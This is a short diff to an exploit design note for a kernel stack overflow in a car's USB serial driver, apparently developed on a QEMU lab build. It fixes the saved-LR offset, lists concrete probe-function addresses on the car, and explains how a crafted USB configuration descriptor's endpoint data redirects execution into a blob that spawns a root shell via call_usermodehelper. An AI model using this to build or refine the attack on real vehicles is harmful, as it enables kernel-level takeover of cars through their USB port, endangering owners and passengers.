@@ -16,12 +16,18 @@ arrays (`bulk_in_endpoint[MAX_NUM_PORTS=8]`, arrays at sp+104, saved
 bulk-IN endpoints overflows the frame:
 
 - bulk_in[17] lands on saved r4
-- bulk_in[26] lands on saved LR (car; 25 in the QEMU lab build)
+- bulk_in[25] lands on saved LR
+
+Both frames push the same 9 registers and keep `bulk_in_endpoint[]`
+exactly 68 bytes below the saved r4, so the slot is 17 and 25 in the lab
+and on the car alike. Car `usb_serial_probe`: `push` at 0xd0c, `sub
+sp,#172`, store at 0xed4 (`add r9,sp,#168; str r3,[r0,#-64]` =
+sp+104+4i), epilogue 0x1700.
 
 Probe returns through the hijacked LR = the 26th endpoint's
 `usb_host_endpoint` (44-byte stride). Its descriptor word@0 is a
 harmless `add` (bLength=9 header bytes), word@4 is
-`ldr pc,[r4,#off]` with off = (26−17)\*44+32 = 0x1AC — pointing into
+`ldr pc,[r4,#off]` with off = (25−17)\*44+32 = 0x180 — pointing into
 the same chunk's `extra` field, i.e. the trailing 252-byte blob in the
 config descriptor. The blob builds argv/envp PC-relative and calls
 `call_usermodehelper("/bin/sh", ["sh","-c",CMD], {NULL}, UMH_WAIT_PROC)`
